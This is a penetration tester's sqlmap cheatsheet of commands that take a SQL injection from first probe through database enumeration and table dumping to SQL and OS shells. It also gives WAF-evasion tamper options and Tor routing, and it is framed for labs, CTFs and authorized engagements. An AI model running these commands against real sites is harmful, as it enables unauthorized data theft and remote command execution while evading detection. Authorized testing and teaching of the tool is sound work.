---
title: sqlmap cheatsheet
description: The sqlmap flags I actually use, from first probe to shell.
date: 2026-11-14
tags: [sqli, web, sqlmap, cheatsheet]
attack: [T1190, T1505.003]
status: finished
---

> Own labs, CTFs or written authorization only.

## Start from a request

A request saved from Burp carries cookies, headers and the POST body. Most reliable way to start.

```bash
sqlmap -r req.txt -p id --batch
```

Straight from a URL. Mind the `?`, without it sqlmap sees no parameter:

```bash
sqlmap -u "http://target/page.php?param1=value1&param2=value2" -p param2 --dbs
```

Path style URLs: mark the injection point with `*`.

```bash
sqlmap -u "http://target/param1/value1*/param2/value2" --dbs
```

Forms and authenticated pages:

```bash
sqlmap -u "$URL" --forms --crawl=2
sqlmap -u "$URL" --cookie="PHPSESSID=..."
```

## Tune the detection

```bash
# default is level 1, risk 1
sqlmap -r req.txt --level=3 --risk=2

# B boolean, E error, U union, S stacked, T time, Q inline
sqlmap -r req.txt --technique=BEU

# known backend, skip the fingerprinting
sqlmap -r req.txt --dbms=mysql
```

## Enumerate

```bash
sqlmap -r req.txt --current-user --current-db --is-dba
sqlmap -r req.txt --privileges
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D "$DATABASE" --tables
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --columns
```

## Dump

```bash
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --dump

# on engagements, prove impact without taking everything
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --count
sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --dump --start=1 --stop=3
```

## Shells

```bash
sqlmap -r req.txt --sql-shell
sqlmap -r req.txt -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
sqlmap -r req.txt --os-shell
```

`--os-shell` on MySQL needs the `FILE` privilege, a writable folder in the webroot and its path. Check `--is-dba` and `--privileges` first.

## Evasion and routing

```bash
# see every request in Burp
sqlmap -r req.txt --proxy=http://127.0.0.1:8080

# WAF in the way
sqlmap -r req.txt --tamper=space2comment,between --random-agent

# CTF or research only
sqlmap -r req.txt --tor --tor-type=SOCKS5 --check-tor
```

## Housekeeping

```bash
# sqlmap caches results per target, start clean
sqlmap -r req.txt --flush-session
```

## Notes

- The default User-Agent says `sqlmap`. Use `--random-agent` or set your own.
- On a contract, traffic should come from the agreed source IPs. Tor breaks that.
- `req.txt` holds session tokens. Keep it out of git and delete it when done.
